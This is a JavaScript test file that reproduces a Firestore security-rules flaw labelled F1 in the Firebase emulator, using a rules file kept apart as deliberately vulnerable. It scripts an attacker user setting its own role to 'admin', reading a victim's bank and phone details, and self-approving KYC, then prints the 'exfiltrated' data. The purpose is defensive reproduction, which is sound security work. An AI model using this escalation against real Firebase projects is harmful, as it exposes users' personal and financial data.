// DEMO ONLY — loads the PRE-FIX (vulnerable) rules to reproduce the F1
// exploit in the emulator. Never deployed (firebase.json uses firestore.rules).
const fs = require("fs"), path = require("path");
const {initializeTestEnvironment} = require("@firebase/rules-unit-testing");
const {doc, setDoc, updateDoc, getDoc} = require("firebase/firestore");
let env;
before(async () => {
  env = await initializeTestEnvironment({
    projectId: "f1-vuln-demo",
    firestore: {rules: fs.readFileSync(path.resolve(__dirname, "firestore.rules.vulnerable"), "utf8")},
  });
});
after(async () => env && env.cleanup());
async function allowed(op) { try { await op; return true; } catch { return false; } }

it("F1 reproduced against the VULNERABLE rules", async () => {
  await env.withSecurityRulesDisabled(async (c) => {
    const db = c.firestore();
    await setDoc(doc(db, "users/attacker"), {role: "requestor", displayName: "Mallory", verificationStatus: "none"});
    await setDoc(doc(db, "users/victim/private/payout"), {bankName: "Maybank", accountLast4: "4821", phone: "+60123456789"});
  });
  const atk = env.authenticatedContext("attacker").firestore();
  const payout = doc(atk, "users/victim/private/payout");
  const before = await allowed(getDoc(payout));
  const esc = await allowed(updateDoc(doc(atk, "users/attacker"), {role: "admin"}));
  let after = false, stolen = null;
  try { const s = await getDoc(payout); after = true; stolen = s.data(); } catch {}
  const kyc = await allowed(updateDoc(doc(atk, "users/attacker"), {verificationStatus: "approved"}));
  console.log("\n  ===== F1 proof against VULNERABLE rules =====");
  console.log(`  1. read victim payout as plain requestor : ${before ? "ALLOWED" : "DENIED (correct)"}`);
  console.log(`  2. write own role = "admin"              : ${esc ? "ALLOWED  <-- VULNERABILITY" : "DENIED"}`);
  console.log(`  3. read victim payout as self-made admin : ${after ? "ALLOWED  <-- PII DISCLOSED" : "DENIED"}`);
  console.log(`  4. self-approve verificationStatus       : ${kyc ? "ALLOWED  <-- KYC BYPASS" : "DENIED"}`);
  if (stolen) console.log(`  Exfiltrated: ${stolen.bankName} ****${stolen.accountLast4} / ${stolen.phone}`);
  console.log("  ============================================");
});
